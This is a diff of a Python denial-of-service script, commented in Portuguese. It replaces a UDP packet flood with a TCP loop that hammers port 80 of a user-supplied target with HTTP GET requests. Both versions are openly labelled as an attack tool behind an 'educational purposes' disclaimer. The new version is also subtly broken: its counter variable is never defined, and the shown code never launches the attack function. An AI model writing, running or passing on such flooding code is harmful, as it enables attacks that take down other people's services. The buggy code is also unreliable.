@@ -1,34 +1,31 @@
-import sys
-import os
-import time
+#importação para poder utilizar o time.sleep e o os.system
 import socket
-import random
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-sock = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-os.system("Clear")
-os.system("figlet Máquina de DDos")
-print ("AVISO: essa ferramenta é apenas para propósitos educacionais, use ao seu risco!")
-print ("github : https://github.com/chokonetz")
-ip = raw_input("IP do alvo: ")
-port = input("Porta: ")
+import threading
+import time
+import os
+#código e avisos
+print('AVISO LEGAL: ESTA FERRAMENTA SERVE PARA PROPÓSITOS EDUCACIONAIS USE AO SEU RISCO!!!')
+time.sleep(5)
 os.system("clear")
-os.system("Ataque iniciado...")
-print ("▄▄▄▄▄                | [50%]...")
-time.sleep(1)
-print ("▄▄▄▄▄▄▄          | [70%]...")
+print('Por chokoznet')
 time.sleep(2)
-print ("▄▄▄▄▄▄▄▄▄▄  | [100%]...")
-time.sleep(1)
-sent = 0
-while True:
-	sock.sendto(bytes, (ip , port))
-	sent = sent + 1
-	port = port +1
-	print("enviado %s packs para %s em port:%s"%(sent , ip , port))
+print("carregando ferramenta...")
+os.system("clear")
+alvo = input('IP do alvo: ')
+seuip = input('seuip: ')
+port = 80
+attack_num = 0
+print('Começando ataque...')
+time.sleep(3)
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((alvo, port))
+        s.sendto(("GET /" + alvo + " HTTP/1.1\r\n").encode('ascii'), (alvo, port))
+        s.sendto(("Host: " + seuip + "\r\n\r\n").encode('ascii'), (alvo, port))
+        
+        global attack_num
+        numerodeataque += 1
+        print(numerodeataque)
+        
+        s.close() 
